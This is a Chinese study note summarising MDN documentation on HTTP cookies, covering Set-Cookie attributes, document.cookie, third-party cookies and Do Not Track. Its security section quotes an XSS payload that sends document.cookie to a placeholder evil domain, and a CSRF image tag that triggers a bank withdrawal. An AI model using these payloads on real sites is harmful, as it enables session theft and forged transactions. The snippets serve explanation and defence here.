---
title: MDN Cookie
date: 2017-06-07
tags: 
	- cookie
	- mdn
categories: 
	- web
---
Cookie主要用在以下三个方面:

- 会话状态管理（如用户登录状态、购物车）
- 个性化设置（如用户自定义设置）
- 浏览器行为跟踪（如跟踪分析用户行为）


### Cookie
HTTP Request Header 
> https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cookie
- Cookie 头可能会被全部忽略，因为浏览器可能会因为隐私原因禁用cookie

### Set-Cookie
HTTP Response Header
> https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie

- 语法
```
Set-Cookie: <cookie-name>=<cookie-value> 
Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
Set-Cookie: <cookie-name>=<cookie-value>; Secure
Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly

Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Strict
Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Lax

// Multiple directives are also possible, for example:
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
```
- cookie-name 可以是任何US-ASCII字符，但是不包括（[CTLs](http://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6)和( ) < > @ , ; : \ " /  [ ] ? = { }）
- cookie-value
可以加双引号表示，可以使用除CTLs外的US-ASCII字符，包括分号空格反斜杠等等
- 以__Secure-或者__Host-开头的cookie必须通在使用https协议的页面上，并且设置secure的flag，后者不允许拥有一个指定的domain，path必须为"/"
- Expire=<date>
cookie的过期时间，在没有指定的情况下，cookie会被认定为session cookie，session cookie会在关闭浏览器时被清除，但是由于大多数浏览器有cookie restore的机制，所以会导致再次打开浏览器时，这些session cookie会依然存在
- Max-Age=<non-zero-digit>，距离cookie过期的时间，作用和Expire相同，但优先级比Expire高
- Domain=<domain-value> 指定该cookie可以被发送到哪些域名下，默认值为当前document的域名，域名的前导"."会被忽略（这点和实际不一样，不知道为啥）
- Path=<path-value>
指定请求资源中必须存在与其匹配的URL地址，地址"/"可以匹配任意子目录，例如 "/docs", "/docs/Web/", or "/docs/Web/HTTP"
- Secure
以Secure标签标识的cookie必须以HTTPS和SSL协议发送请求，从Chrome52+和FF52+版本之后，非HTTPS协议的网站不能设置Secure cookies了


### Document.cookie

> https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie

### 安全和隐私
- 会话劫持和XSS
```
//将当前站点的cookies通过请求发送到不安全的服务器上
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
- 跨站请求伪造（[CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)）
```
//发送跨站请求，利用当前存储的cookies使请求成功
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```
- 第三方Cookie
Domain和document.domain相同的cookie被称为第一方cookie，不同的称为第三方cookie，前者只与当前domain的服务器进行交互，后者主要用于网络追踪和广告

- [`Do Not Track`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/DNT) request header, 用于请求头中，标记用户更倾向于隐私保护还是提供个性化内容，值为0或1，也可以通过`navigator.doNotTrack`获取其中的值